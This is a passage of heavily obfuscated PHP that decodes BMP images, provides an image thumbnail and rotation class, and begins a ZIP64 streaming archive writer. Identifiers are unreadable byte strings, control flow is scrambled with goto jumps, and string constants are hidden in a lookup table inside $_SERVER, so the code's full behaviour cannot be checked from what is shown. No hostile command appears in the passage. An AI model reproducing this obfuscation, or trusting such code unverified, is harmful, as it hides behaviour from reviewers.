$dİÚãØÒ„ì >> $F˜çõæ‹) >> $Eó´¾¸›Ñ - $F˜çõæ‹]); } break; } break; default: $F±¤ãõ—¸˜ = fread($bç÷óÕŸõ, 1); if ($F±¤ãõ—¸˜ === !1) { imagedestroy($D‹Êöç”õä); return !1; } list(, $D÷Â­¡éÃÏ, $AÅ¡®Õ¶š) = unpack($C ¿‹«±›[1834], $Bô§êöÖŒñ . $F±¤ãõ—¸˜); for ($dãÃµ‚ÈÂÉ = 0, $DóÈ²‰Ø”² = 0; $dãÃµ‚ÈÂÉ < $D÷Â­¡éÃÏ; ++$dãÃµ‚ÈÂÉ, ++$B¸™ÍíÇÁ, $DóÈ²‰Ø”² += $f¿ôèòëï) { $F˜çõæ‹ = $DóÈ²‰Ø”² & 7; imagesetpixel($D‹Êöç”õä, $B¸™ÍíÇÁ, $E”ÀÀ©…‹, $c‰¬ñ•ÕÓ“[($AÅ¡®Õ¶š & $dİÚãØÒ„ì >> $F˜çõæ‹) >> $Eó´¾¸›Ñ - $F˜çõæ‹]); } break; } } } else { for ($fßößšîé® = 0; $fßößšîé® < $D°™Éƒ ØÔ; ++$fßößšîé®, $E”ÀÀ©…‹ += $Fó³„àğİ) { $Bô§êöÖŒñ = fread($bç÷óÕŸõ, $EÔš£œŒá); if ($Bô§êöÖŒñ === !1) { imagedestroy($D‹Êöç”õä); return !1; } $DóÈ²‰Ø”² = 0; for ($B¸™ÍíÇÁ = 0; $B¸™ÍíÇÁ < $cÅƒ–ôæÕï; ++$B¸™ÍíÇÁ, $DóÈ²‰Ø”² += $f¿ôèòëï) { list(, $AÅ¡®Õ¶š) = unpack($C ¿‹«±›[1835], $Bô§êöÖŒñ[$DóÈ²‰Ø”² >> 3]); $F˜çõæ‹ = $DóÈ²‰Ø”² & 7; imagesetpixel($D‹Êöç”õä, $B¸™ÍíÇÁ, $E”ÀÀ©…‹, $c‰¬ñ•ÕÓ“[($AÅ¡®Õ¶š & $dİÚãØÒ„ì >> $F˜çõæ‹) >> $Eó´¾¸›Ñ - $F˜çõæ‹]); } } } goto f¶Ş¡ø”¿¿; f¶Ş¡ø”¿¿: } else { goto A®Ç™Š·è; E¿È—Ÿ¤Ÿ: for ($fßößšîé® = 0; $fßößšîé® < $D°™Éƒ ØÔ; ++$fßößšîé®, $E”ÀÀ©…‹ += $Fó³„àğİ) { $Bô§êöÖŒñ = fread($bç÷óÕŸõ, $EÔš£œŒá); if ($Bô§êöÖŒñ === !1) { imagedestroy($D‹Êöç”õä); return !1; } $DóÈ²‰Ø”² = 0; for ($B¸™ÍíÇÁ = 0; $B¸™ÍíÇÁ < $cÅƒ–ôæÕï; ++$B¸™ÍíÇÁ, $DóÈ²‰Ø”² += $CÇ£ô”¾Õ¤) { list(, $AÅ¡®Õ¶š) = unpack($C ¿‹«±›[1812], substr($Bô§êöÖŒñ, $DóÈ²‰Ø”², $CÇ£ô”¾Õ¤) . $C ¿‹«±›[1836]); $a½£èŠ’èñ = $AÅ¡®Õ¶š & $b¥¤ñ«µÔŸ; $Câï£ï™–³ = $AÅ¡®Õ¶š & $f‹èßõÄ´; $Eã¾Ç‰¶‚ = $AÅ¡®Õ¶š & $bá‡‡ê¡æ¡; $AÆ´¢¶Ô¹¹ = $AÅ¡®Õ¶š & $FÚªŸÀì¨±; $bø¼ëªö‰ = $Få¨ã¥¼ŒÉ - (($a½£èŠ’èñ << 7) - $a½£èŠ’èñ) * $AÙ¹æËªÒÖ; $d¨¿’’Šè¡ = (($Câï£ï™–³ << 8) - $Câï£ï™–³) * $FŠŸÜŒ„ŞŒ; $A²ƒîÀÕ… = (($Eã¾Ç‰¶‚ << 8) - $Eã¾Ç‰¶‚) * $d³îƒÏä; $F˜çõæ‹ = (($AÆ´¢¶Ô¹¹ << 8) - $AÆ´¢¶Ô¹¹) * $c‡Å±Ş´ç¾; imagesetpixel($D‹Êöç”õä, $B¸™ÍíÇÁ, $E”ÀÀ©…‹, $bø¼ëªö‰ << 24 | $d¨¿’’Šè¡ << 16 | $A²ƒîÀÕ… << 8 | $F˜çõæ‹); } } imagealphablending($D‹Êöç”õä, !0); goto AŒì©÷³¤ß; Aùõ–¨ô´: $CÇ£ô”¾Õ¤ = $f¿ôèòëï >> 3; $Få¨ã¥¼ŒÉ = $b¥¤ñ«µÔŸ ? 127 : 0; $AÙ¹æËªÒÖ = $b¥¤ñ«µÔŸ ? 1 / $b¥¤ñ«µÔŸ : 1; goto E¬¢¨†Û’; E¬¢¨†Û’: $FŠŸÜŒ„ŞŒ = $f‹èßõÄ´ ? 1 / $f‹èßõÄ´ : 1; $d³îƒÏä = $bá‡‡ê¡æ¡ ? 1 / $bá‡‡ê¡æ¡ : 1; $c‡Å±Ş´ç¾ = $FÚªŸÀì¨± ? 1 / $FÚªŸÀì¨± : 1; goto E¿È—Ÿ¤Ÿ; A®Ç™Š·è: $D‹Êöç”õä = imagecreatetruecolor($cÅƒ–ôæÕï, $D°™Éƒ ØÔ); imagealphablending($D‹Êöç”õä, !1); if ($b¥¤ñ«µÔŸ) { imagesavealpha($D‹Êöç”õä, !0); } goto Aùõ–¨ô´; AŒì©÷³¤ß: } return $D‹Êöç”õä; goto bÄé›Ü¥¾Ğ; bÄé›Ü¥¾Ğ: } } class ImageThumb { var $srcFile = ''; var $imgData = ''; var $echoType; var $im = ''; var $srcW = ''; var $srcH = ''; function __construct($Dà÷ê ™……, $B…òÓÓ™ïÈ) { goto Bš™ªÆ÷Ù; Bš™ªÆ÷Ù: $this->srcFile = $Dà÷ê ™……; $this->echoType = $B…òÓÓ™ïÈ; $this->im = self::image($Dà÷ê ™……); goto BÚÆºèÄôµ; BÚÆºèÄôµ: if (!$this->im) { return !1; } $b³Û¸Ò ê½ = $_SERVER[Ö][33]; $this->imgData = GetImageSize($Dà÷ê ™……, $b³Û¸Ò ê½); goto fÒ ôé‚; fÒ ôé‚: $this->srcW = imageSX($this->im); $this->srcH = imageSY($this->im); return $this; goto d•ÍïŞ‘……; d•ÍïŞ‘……: } public static function image($A×©‚è÷ÖÆ) { $D‡ƒôŒ°Ğõ =& $_SERVER[Ö]; $BİŒĞ ­Ä½ = $D‡ƒôŒ°Ğõ[33]; $e³·Ç·‡„¹ = GetImageSize($A×©‚è÷ÖÆ, $BİŒĞ ­Ä½); $DÕ…¬š·ù = !1; switch ($e³·Ç·‡„¹[2]) { case IMAGETYPE_GIF: if (!function_exists($D‡ƒôŒ°Ğõ[1837])) { break; } $DÕ…¬š·ù = imagecreatefromgif($A×©‚è÷ÖÆ); break; case IMAGETYPE_JPEG: if (!function_exists($D‡ƒôŒ°Ğõ[1838])) { break; } $DÕ…¬š·ù = imagecreatefromjpeg($A×©‚è÷ÖÆ); break; case IMAGETYPE_PNG: if (!function_exists($D‡ƒôŒ°Ğõ[1839])) { break; } $DÕ…¬š·ù = @imagecreatefrompng($A×©‚è÷ÖÆ); imagesavealpha($DÕ…¬š·ù, !0); break; case IMAGETYPE_XBM: $DÕ…¬š·ù = imagecreatefromxbm($A×©‚è÷ÖÆ); break; case IMAGETYPE_WBMP: $DÕ…¬š·ù = imagecreatefromwbmp($A×©‚è÷ÖÆ); break; case IMAGETYPE_BMP: $DÕ…¬š·ù = imagecreatefrombmp($A×©‚è÷ÖÆ); break; default: break; } return $DÕ…¬š·ù; } public static function imageSize($EŠ¶àø†„) { $AÈ¶„é¶îË =& $_SERVER[Ö]; $B¦ƒÜ·ï¦õ = GetImageSize($EŠ¶àø†„); if (!$B¦ƒÜ·ï¦õ) { return !1; } return array($AÈ¶„é¶îË[1840] => $B¦ƒÜ·ï¦õ[0], $AÈ¶„é¶îË[1841] => $B¦ƒÜ·ï¦õ[1]); } function distortion($DÆÃ‰·š…¯, $dë‰¾Àà‡, $dÀ›¶§Öß) { $Fˆêµ¶ÆË = $this->creatImage($this->im, $dë‰¾Àà‡, $dÀ›¶§Öß, 0, 0, 0, 0, $this->srcW, $this->srcH); return $this->echoImage($Fˆêµ¶ÆË, $DÆÃ‰·š…¯); } function prorate($AËø ±Ü²Ú, $CÍÍ‡œñ¬­, $c…¿ñ¨Î…š) { $E·¤½Ú = $CÍÍ‡œñ¬­ / $c…¿ñ¨Î…š; $DÏ´Ï’¢ç = $this->srcW / $this->srcH; if ($E·¤½Ú <= $DÏ´Ï’¢ç) { $DÇõ…‘Äâ™ = $CÍÍ‡œñ¬­; $EÁÕŒï‚”Í = $DÇõ…‘Äâ™ * ($this->srcH / $this->srcW); } else { $EÁÕŒï‚”Í = $c…¿ñ¨Î…š; $DÇõ…‘Äâ™ = $EÁÕŒï‚”Í * ($this->srcW / $this->srcH); } if ($this->srcW > $CÍÍ‡œñ¬­ || $this->srcH > $c…¿ñ¨Î…š) { $cÔ§¨Ï¸ÍÚ = $this->creatImage($this->im, $DÇõ…‘Äâ™, $EÁÕŒï‚”Í, 0, 0, 0, 0, $this->srcW, $this->srcH); return $this->echoImage($cÔ§¨Ï¸ÍÚ, $AËø ±Ü²Ú); } else { $cÔ§¨Ï¸ÍÚ = $this->creatImage($this->im, $this->srcW, $this->srcH, 0, 0, 0, 0, $this->srcW, $this->srcH); return $this->echoImage($cÔ§¨Ï¸ÍÚ, $AËø ±Ü²Ú); } } function cut($cÏó¼ğ©¡, $F¹›Á§”›Ë, $F»Çß«¨Îˆ) { goto A¦«¯İÁğ; aŸÑœŠÌ: $bŸÉÊ‹ŒªĞ = $this->creatImage($this->im, $B×ç‡…î™Ñ, $CÇƒåïÍ£Ã, 0, 0, 0, 0, $this->srcW, $this->srcH); $eÑŞì èİ = $this->creatImage($bŸÉÊ‹ŒªĞ, $F¹›Á§”›Ë, $F»Çß«¨Îˆ, 0, 0, ($B×ç‡…î™Ñ - $F¹›Á§”›Ë) / 2, ($CÇƒåïÍ£Ã - $F»Çß«¨Îˆ) / 2, $F¹›Á§”›Ë, $F»Çß«¨Îˆ); imageDestroy($bŸÉÊ‹ŒªĞ); goto FĞÄÔÄÀ; A¦«¯İÁğ: $bäÎØ—İ¡„ = $F¹›Á§”›Ë / $F»Çß«¨Îˆ; $b§¸¹ÜŸÀä = $this->srcW / $this->srcH; if ($bäÎØ—İ¡„ <= $b§¸¹ÜŸÀä) { $CÇƒåïÍ£Ã = $F»Çß«¨Îˆ; $B×ç‡…î™Ñ = $CÇƒåïÍ£Ã * ($this->srcW / $this->srcH); } else { $B×ç‡…î™Ñ = $F¹›Á§”›Ë; $CÇƒåïÍ£Ã = $B×ç‡…î™Ñ * ($this->srcH / $this->srcW); } goto aŸÑœŠÌ; FĞÄÔÄÀ: return $this->echoImage($eÑŞì èİ, $cÏó¼ğ©¡); goto dÀÙ–íš¼; dÀÙ–íš¼: } function backFill($bô§ä±«İŞ, $bÊÏˆ›’é±, $Aó©ƒ¦­ˆñ, $B¤±ñ¡Ì¥¸ = false, $béÁŠíŸƒ = 255, $AÛ™˜ñšêá = 255, $D²’‹³¬‹ = 255) { goto E®öİá©Éº; bìã‹ã—ÆÈ: return $this->echoImage($BŸ­µäÀŒà, $bô§ä±«İŞ); goto FÂŠŒ“æ‚„; aĞÈğ™Ê‹ã: if (function_exists($_SERVER[Ö][1842])) { @($BŸ­µäÀŒà = imageCreateTrueColor($bÊÏˆ›’é±, $Aó©ƒ¦­ˆñ)); if (!$BŸ­µäÀŒà) { $BŸ­µäÀŒà = imageCreate($bÊÏˆ›’é±, $Aó©ƒ¦­ˆñ); } } else { $BŸ­µäÀŒà = imageCreate($bÊÏˆ›’é±, $Aó©ƒ¦­ˆñ); } $eØ¬¤«±õ = ($Aó©ƒ¦­ˆñ - $c¼¼÷Œ“‹í) / 2; $e®ÓÍÕ£½” = imagecolorallocate($BŸ­µäÀŒà, $béÁŠíŸƒ, $AÛ™˜ñšêá, $D²’‹³¬‹); goto E¿†”ÕØòá; E¿†”ÕØòá: if ($B¤±ñ¡Ì¥¸) { $e®ÓÍÕ£½” = imageColorTransparent($BŸ­µäÀŒà, $e®ÓÍÕ£½”); $eØ¬¤«±õ = $Aó©ƒ¦­ˆñ - $c¼¼÷Œ“‹í; } imageFilledRectangle($BŸ­µäÀŒà, 0, 0, $bÊÏˆ›’é±, $Aó©ƒ¦­ˆñ, $e®ÓÍÕ£½”); if ($this->srcW > $bÊÏˆ›’é± || $this->srcH > $Aó©ƒ¦­ˆñ) { $båÛ±Îë¨° = $this->creatImage($this->im, $cÏÚ‘ñí‚², $c¼¼÷Œ“‹í, 0, 0, 0, 0, $this->srcW, $this->srcH); if ($cÏÚ‘ñí‚² < $bÊÏˆ›’é±) { imageCopy($BŸ­µäÀŒà, $båÛ±Îë¨°, ($bÊÏˆ›’é± - $cÏÚ‘ñí‚²) / 2, 0, 0, 0, $cÏÚ‘ñí‚², $c¼¼÷Œ“‹í); } else { if ($c¼¼÷Œ“‹í < $Aó©ƒ¦­ˆñ) { imageCopy($BŸ­µäÀŒà, $båÛ±Îë¨°, 0, $eØ¬¤«±õ, 0, 0, $cÏÚ‘ñí‚², $c¼¼÷Œ“‹í); } else { imageCopy($BŸ­µäÀŒà, $båÛ±Îë¨°, 0, 0, 0, 0, $cÏÚ‘ñí‚², $c¼¼÷Œ“‹í); } } } else { imageCopyMerge($BŸ­µäÀŒà, $this->im, ($bÊÏˆ›’é± - $cÏÚ‘ñí‚²) / 2, $eØ¬¤«±õ, 0, 0, $cÏÚ‘ñí‚², $c¼¼÷Œ“‹í, 100); } goto bìã‹ã—ÆÈ; E®öİá©Éº: $BÛáƒ¸‹î» = $bÊÏˆ›’é± / $Aó©ƒ¦­ˆñ; $DÌ »ÒÉ±‹ = $this->srcW / $this->srcH; if ($BÛáƒ¸‹î» <= $DÌ »ÒÉ±‹) { $cÏÚ‘ñí‚² = $bÊÏˆ›’é±; $c¼¼÷Œ“‹í = $cÏÚ‘ñí‚² * ($this->srcH / $this->srcW); } else { $c¼¼÷Œ“‹í = $Aó©ƒ¦­ˆñ; $cÏÚ‘ñí‚² = $c¼¼÷Œ“‹í * ($this->srcW / $this->srcH); } goto aĞÈğ™Ê‹ã; FÂŠŒ“æ‚„: } function creatImage($fåšâ’íÄØ, $EÄ ·ÉÔ”, $F¢‚ï¿ÔÃƒ, $bæ¡¥ò‡æµ, $aÇ„ì„»±, $A¿­ƒÈÃîö, $CÊË¤²Íš, $EÒì§ÏÊŞ‰, $dÆÅˆæ¨ç) { if (function_exists($_SERVER[Ö][1842])) { @($b¥Ãß®¬ï = ImageCreateTrueColor($EÄ ·ÉÔ”, $F¢‚ï¿ÔÃƒ)); @imagealphablending($b¥Ãß®¬ï, !1); @imagesavealpha($b¥Ãß®¬ï, !0); if ($b¥Ãß®¬ï) { imageCopyResampled($b¥Ãß®¬ï, $fåšâ’íÄØ, $bæ¡¥ò‡æµ, $aÇ„ì„»±, $A¿­ƒÈÃîö, $CÊË¤²Íš, $EÄ ·ÉÔ”, $F¢‚ï¿ÔÃƒ, $EÒì§ÏÊŞ‰, $dÆÅˆæ¨ç); } else { $b¥Ãß®¬ï = ImageCreate($EÄ ·ÉÔ”, $F¢‚ï¿ÔÃƒ); imageCopyResized($b¥Ãß®¬ï, $fåšâ’íÄØ, $bæ¡¥ò‡æµ, $aÇ„ì„»±, $A¿­ƒÈÃîö, $CÊË¤²Íš, $EÄ ·ÉÔ”, $F¢‚ï¿ÔÃƒ, $EÒì§ÏÊŞ‰, $dÆÅˆæ¨ç); } } else { $b¥Ãß®¬ï = ImageCreate($EÄ ·ÉÔ”, $F¢‚ï¿ÔÃƒ); imageCopyResized($b¥Ãß®¬ï, $fåšâ’íÄØ, $bæ¡¥ò‡æµ, $aÇ„ì„»±, $A¿­ƒÈÃîö, $CÊË¤²Íš, $EÄ ·ÉÔ”, $F¢‚ï¿ÔÃƒ, $EÒì§ÏÊŞ‰, $dÆÅˆæ¨ç); } return $b¥Ãß®¬ï; } public function imgRotate($F½º‘ˆõÔµ, $D„¾•Ã‹­) { goto eÙ­†ÜÔÙ; eÙ­†ÜÔÙ: if (!$this->im || $D„¾•Ã‹­ % 360 === 0 || !function_exists($_SERVER[Ö][1843])) { return !1; } $CÓ»À‰åá = imageRotate($this->im, 360 - $D„¾•Ã‹­, 0); $aŸÒ×èĞ ã = !1; goto C˜³ÇÈˆÏ; C˜³ÇÈˆÏ: switch ($this->imgData[2]) { case IMAGETYPE_GIF: $aŸÒ×èĞ ã = imagegif($CÓ»À‰åá, $F½º‘ˆõÔµ); break; case IMAGETYPE_JPEG: $aŸÒ×èĞ ã = imagejpeg($CÓ»À‰åá, $F½º‘ˆõÔµ, 100); break; case IMAGETYPE_PNG: $aŸÒ×èĞ ã = imagePNG($CÓ»À‰åá, $F½º‘ˆõÔµ); break; default: break; } imageDestroy($CÓ»À‰åá); imageDestroy($this->im); goto eÈÚĞŞÙ¯‚; eÈÚĞŞÙ¯‚: return $aŸÒ×èĞ ã; goto D’µª¬ù‚Á; D’µª¬ù‚Á: } function echoImage($B»ùËŒæùÇ, $Cğ†£µ‘Ò) { goto E–ŠáÌ¼ƒ; a‘ƒ‹ÂÁ‹£: $E÷¡¦¬ê‡Ü = !1; switch ($this->echoType) { case $D×ø³’‘µ¤[1844]: $E÷¡¦¬ê‡Ü = imagePNG($B»ùËŒæùÇ); break; case $D×ø³’‘µ¤[163]: $E÷¡¦¬ê‡Ü = imagePNG($B»ùËŒæùÇ, $Cğ†£µ‘Ò); break; } imageDestroy($B»ùËŒæùÇ); goto fÄË½†š; E–ŠáÌ¼ƒ: $D×ø³’‘µ¤ =& $_SERVER[Ö]; if (!$B»ùËŒæùÇ) { return !1; } ob_get_clean(); goto a‘ƒ‹ÂÁ‹£; fÄË½†š: imageDestroy($this->im); return $E÷¡¦¬ê‡Ü; goto Fá‰ğØä; Fá‰ğØä: } } goto BÖÍ–¨ñö; BË…‚“‚¨ó: class ZipMake { const VERSION = "\60\56\62\56\x30"; const ZIP_VERSION = 10; const ZIP_VERSION_64 = 45; const METHOD_STORE = 0; const FILE_HEADER_SIGNATURE = 67324752; const CDR_FILE_SIGNATURE = 33639248; const CDR_EOF_SIGNATURE = 101010256; const DATA_DESCRIPTOR_SIGNATURE = 134695760; const ZIP64_CDR_EOF_SIGNATURE = 101075792; const ZIP64_CDR_LOCATOR_SIGNATURE = 117853008; public $files = array(); public $cdrOffset = 0; public $ofs = 0; protected $needHeaders; protected $outputName; public function __construct($C©À£°óÄ™ = null) { $C¿ôÔ˜Çá =& $_SERVER[Ö]; $this->outputStream = fopen($C¿ôÔ˜Çá[1982], $C¿ôÔ˜Çá[1211]); $this->outputName = $C©À£°óÄ™; $this->needHeaders = !0; } public function addFile($C‡“”©¢¼, $F™µ¬Û„è—) { goto e‹öŒêÒÒ; bàßÅÅö: while (!feof($DêĞ¼Õ÷)) { $b©ˆõ»ÙÉÚ = fread($DêĞ¼Õ÷, 1048576); $this->send($b©ˆõ»ÙÉÚ); } fclose($DêĞ¼Õ÷); $A¯À·œ•ø = hexdec(hash_file($Eàœ†Ÿ×ÁË[1984], $F™µ¬Û„è—)); goto AËÉ‡•Ì×ñ; a×¾ñË¾İ­: $F¾ÈğŠ¿Ú = $this->addFileHeader($C‡“”©¢¼, $A‰‚Ô¹èÀ„); $eÃ«´ô´·± = $D÷š‹ñøèº = filesize($F™µ¬Û„è—); $DêĞ¼Õ÷ = fopen($F™µ¬Û„è—, $Eàœ†Ÿ×ÁË[1983]); goto bàßÅÅö; AËÉ‡•Ì×ñ: $this->addFileFooter($C‡“”©¢¼, $A‰‚Ô¹èÀ„, $A¯À·œ•ø, $eÃ«´ô´·±, $D÷š‹ñøèº, $F¾ÈğŠ¿Ú); goto eí»ÓËÖŞ™; e‹öŒêÒÒ: $Eàœ†Ÿ×ÁË =& $_SERVER[Ö]; $C‡“”©¢¼ = $this->filterFilename($C‡“”©¢¼); $A‰‚Ô¹èÀ„ = static::METHOD_STORE; goto a×¾ñË¾İ­; eí»ÓËÖŞ™: } public function addFileFromStream($CÆİ„‘ÚøÕ, $dŒ˜õõÁƒ…) { goto dİŒ¹ë¾Óğ; D±ËÀ­¡ï¹: fseek($dŒ˜õõÁƒ…, 0, SEEK_END); $C«Ëº¡×É« = $FÒÓÖ½ÎƒÅ = ftell($dŒ˜õõÁƒ…); rewind($dŒ˜õõÁƒ…); goto b°Š˜½…ö; c‚âó‹åÜÃ: $this->addFileFooter($CÆİ„‘ÚøÕ, $fªç½ Ì…Á, $AéßÑØ÷µ‚, $C«Ëº¡×É«, $FÒÓÖ½ÎƒÅ, $f×ßøç·Øè); goto d‡ØèšéÁ¤; dİŒ¹ë¾Óğ: $CÆİ„‘ÚøÕ = $this->filterFilename($CÆİ„‘ÚøÕ); $fªç½ Ì…Á = static::METHOD_STORE; $f×ßøç·Øè = $this->addFileHeader($CÆİ„‘ÚøÕ, $fªç½ Ì…Á); goto D±ËÀ­¡ï¹; b°Š˜½…ö: $d î¼Øì‹‰ = hash_init($_SERVER[Ö][1984]); while (!feof($dŒ˜õõÁƒ…)) { $B¿Šë©»ƒœ = fread($dŒ˜õõÁƒ…, 1048576); hash_update($d î¼Øì‹‰, $B¿Šë©»ƒœ); $this->send($B¿Šë©»ƒœ); } $AéßÑØ÷µ‚ = hexdec(hash_final($d î¼Øì‹‰)); goto c‚âó‹åÜÃ; d‡ØèšéÁ¤: } public function finish() { foreach ($this->files as $E¬÷ÀÎŠÏ) { $this->addCdrFile($E¬÷ÀÎŠÏ); } $this->addCdr64Eof(); $this->addCdr64Locator(); $this->addCdrEof(); $this->clear(); } protected function addFileHeader($bğÔáº©ì‹, $fÃéš“µ„„) { goto aÄèÙ©ÙÔ; cáàÊé®¶“: return strlen($dÄâãÎĞ‘Ó) + $f¹íçáâ¡ + strlen($bñ¾ï“–); goto A¼•®ëÄÁ‰; aÄèÙ©ÙÔ: $F†îÉÎî‹ =& $_SERVER[Ö]; $bğÔáº©ì‹ = preg_replace($F†îÉÎî‹[1985], $F†îÉÎî‹[33], $bğÔáº©ì‹); $f¹íçáâ¡ = strlen($bğÔáº©ì‹); goto aªÜÜ‰äÏ»; Fœï‚·×‚«: $dÄâãÎĞ‘Ó = $this->packFields($FºöÓªÈ§…); $bñ¾ï“– = $this->packFields($f†Õ¡Â§ ); $this->send($dÄâãÎĞ‘Ó . $bğÔáº©ì‹ . $bñ¾ï“–); goto cáàÊé®¶“; aªÜÜ‰äÏ»: $C°«•ˆçÚÕ = $this->dosTime(time()); $FºöÓªÈ§… = array(array($F†îÉÎî‹[1986], static::FILE_HEADER_SIGNATURE), array($F†îÉÎî‹[1987], static::ZIP_VERSION_64), array($F†îÉÎî‹[1987], 8), array($F†îÉÎî‹[1987], $fÃéš“µ„„), array($F†îÉÎî‹[1986], $C°«•ˆçÚÕ), array($F†îÉÎî‹[1986], 0), array($F†îÉÎî‹[1986], 4294967295), array($F†îÉÎî‹[1986], 4294967295), array($F†îÉÎî‹[1987], $f¹íçáâ¡), array($F†îÉÎî‹[1987], 32)); $f†Õ¡Â§  = array(array($F†îÉÎî‹[1987], 1), array($F†îÉÎî‹[1987], 28), array($F†îÉÎî‹[1988], 0), array($F†îÉÎî‹[1988], 0), array($F†îÉÎî‹[1988], 0), array($F†îÉÎî‹[1986], 0)); goto Fœï‚·×‚«; A¼•®ëÄÁ‰: } protected function addFileFooter($aœîˆäöâí, $Eç«É–ÉÚ’, $aé„ù¡Ö„à, $AˆÇ¡¼ƒèå, $fªŒŠùÒ¸ , $a‰èó‹äª‘) { $F¼ÌªµˆÖ =& $_SERVER[Ö]; $BÖôÎÅè­• = array(array($F¼ÌªµˆÖ[1986], static::DATA_DESCRIPTOR_SIGNATURE), array($F¼ÌªµˆÖ[1986], $aé„ù¡Ö„à), array($F¼ÌªµˆÖ[1988], $AˆÇ¡¼ƒèå), array($F¼ÌªµˆÖ[1988], $fªŒŠùÒ¸ )); $bïºº†İÑÙ = $this->packFields($BÖôÎÅè­•); $this->send($bïºº†İÑÙ); $eªÁ¼–Üé° = $a‰èó‹äª‘ + $AˆÇ¡¼ƒèå + $fàïµµĞË; $this->addToCdr($aœîˆäöâí, $Eç«É–ÉÚ’, $aé„ù¡Ö„à, $AˆÇ¡¼ƒèå, $fªŒŠùÒ¸ , $eªÁ¼–Üé°); } private function addToCdr($DÊˆì–§¶ë, $E¬»šòˆĞÔ, $fÑŸŞÚª®Ö, $cŒ£é‘ , $fæÀôŠ²™, $fÍµóè‚Š) { $this->files[] = array($DÊˆì–§¶ë, $E¬»šòˆĞÔ, $fÑŸŞÚª®Ö, $cŒ£é‘ , $fæÀôŠ²™, $this->ofs); $this->ofs += $fÍµóè‚Š; } protected function addCdrFile($FİÒ—•©ï) { goto C‡ã§Ğ†ï¸; e”»æ»‰‹¥: $aåã”è÷Ç = $this->dosTime(time()); $aæŠ’ŠÄ‘ = array(array($E×¿Ù‹¿’«[1986], static::CDR_FILE_SIGNATURE), array($E×¿Ù‹¿’«[1987], static::ZIP_VERSION_64), array($E×¿Ù‹¿’«[1987], static::ZIP_VERSION_64), array($E×¿Ù‹¿’«[1987], 8), array($E×¿Ù‹¿’«[1987], $B¨™±½µ›‰), array($E×¿Ù‹¿’«[1986], $aåã”è÷Ç), array($E×¿Ù‹¿’«[1986], $c×ÖÊÜË­‘), array($E×¿Ù‹¿’«[1986], 4294967295), array($E×¿Ù‹¿’«[1986], 4294967295), array($E×¿Ù‹¿’«[1987], strlen($D‰âçè¸Û)), array($E×¿Ù‹¿’«[1987], 32), array($E×¿Ù‹¿’«[1987], strlen($c˜¢âìÜ’–)), array($E×¿Ù‹¿’«[1987], 0), array($E×¿Ù‹¿’«[1987], 0), array($E×¿Ù‹¿’«[1986], 32), array($E×¿Ù‹¿’«[1986], 4294967295)); $aÃÅõÍ”°ë = array(array($E×¿Ù‹¿’«[1987], 1), array($E×¿Ù‹¿’«[1987], 28), array($E×¿Ù‹¿’«[1988], $fº”‚³–îï), array($E×¿Ù‹¿’«[1988], $C«ªÙ£„¿ç), array($E×¿Ù‹¿’«[1988], $D±µ‚–†—ğ), array($E×¿Ù‹¿’«[1986], 0)); goto Aà·‘ŒéÒ•; C‡ã§Ğ†ï¸: $E×¿Ù‹¿’« =& $_SERVER[Ö]; list($D‰âçè¸Û, $B¨™±½µ›‰, $c×ÖÊÜË­‘, $C«ªÙ£„¿ç, $fº”‚³–îï, $D±µ‚–†—ğ) = $FİÒ—•©ï; $c˜¢âìÜ’– = $E×¿Ù‹¿’«[33]; goto e”»æ»‰‹¥; eáÈïËä¿: $this->send($C©à±ì’Š); $this->cdr_ofs += strlen($C©à±ì’Š); goto C†®Ö‡­Èº; Aà·‘ŒéÒ•: $f•Û•–¡Á‚ = $this->packFields($aæŠ’ŠÄ‘); $bÅ÷­ÎÊ¸ = $this->packFields($aÃÅõÍ”°ë); $C©à±ì’Š = $f•Û•–¡Á‚ . $D‰âçè¸Û . $c˜¢âìÜ’– . $bÅ÷­ÎÊ¸; goto eáÈïËä¿; C†®Ö‡­Èº: } protected function addCdr64Eof() { goto cÒœê…¶¯Ô; cÒœê…¶¯Ô: $Aù‹Ü÷·” =& $_SERVER[Ö]; $Eà¿°ÜäŠÔ = count($this->files); $E•ïæĞ‚§¼ = $this->cdr_ofs; goto D¸Õ›ò‰¬; D¸Õ›ò‰¬: $F¥‘¹˜ñ…“ = $this->ofs; $Eº”¸Ğ¨­ = array(array($Aù‹Ü÷·”[1986], static::ZIP64_CDR_EOF_SIGNATURE), array($Aù‹Ü÷·”[1988], 44), array($Aù‹Ü÷·”[1987], static::ZIP_VERSION_64), array($Aù‹Ü÷·”[1987], static::ZIP_VERSION_64), array($Aù‹Ü÷·”[1986], 0), array($Aù‹Ü÷·”[1986], 0), array($Aù‹Ü÷·”[1988], $Eà¿°ÜäŠÔ), array($Aù‹Ü÷·”[1988], $Eà¿°ÜäŠÔ), array($Aù‹Ü÷·”[1988], $E•ïæĞ‚§¼), array($Aù‹Ü÷·”[1988], $F¥‘¹˜ñ…“)); $eè»İÔˆ = $this->packFields($Eº”¸Ğ¨­); goto A“ƒ»‘£§¤; A“ƒ»‘£§¤: $this->send($eè»İÔˆ); goto dÂ‚Í§³ñö; dÂ‚Í§³ñö: } protected function addCdr64Locator() { goto DÅÄá¢«»; DÅÄá¢«»: $f‹—Ïš¶Š =& $_SERVER[Ö]; $F ËÑË™î´ = count($this->files); $b¬†‚ˆ‹ƒ® = $this->cdr_ofs; goto a“Óí¸ÚÀ„; AÒñù„Ë•…: $this->send($AÓ°ÇÒïß˜); goto bíÆñ°ßó³; a“Óí¸ÚÀ„: $d²¹óòªÇ = $this->ofs; $Fæ„“‚Øº = array(array($f‹—Ïš¶Š[1986], static::ZIP64_CDR_LOCATOR_SIGNATURE), array($f‹—Ïš¶Š[1986], 0), array($f‹—Ïš¶Š[1988], $d²¹óòªÇ + $b¬†‚ˆ‹ƒ®), array($f‹—Ïš¶Š[1986], 1)); $AÓ°ÇÒïß˜ = $this->packFields($Fæ„“‚Øº); goto AÒñù„Ë•…; bíÆñ°ßó³: } protected function addCdrEof() { goto c­²áé‹; C•ÄĞÊ‡ÅŠ: $féÀô¼áç¼ = $this->ofs; $bñ¤ÙˆØôã = $DÇ’ªÓ–†¥[33]; $BŞ¼Û®Œ± = array(array($DÇ’ªÓ–†¥[1986], static::CDR_EOF_SIGNATURE), array($DÇ’ªÓ–†¥[1987], 0), array($DÇ’ªÓ–†¥[1987], 0), array($DÇ’ªÓ–†¥[1987], $E²Óí‡œóš), array($DÇ’ªÓ–†¥[1987], $E²Óí‡œóš), array($DÇ’ªÓ–†¥[1986], 4294967295), array($DÇ’ªÓ–†¥[1986], 4294967295), array($DÇ’ªÓ–†¥[1987], strlen($bñ¤ÙˆØôã))); goto aÜÌ°óƒêš; aÜÌ°óƒêš: $fÈ†ŠÜˆÊá = 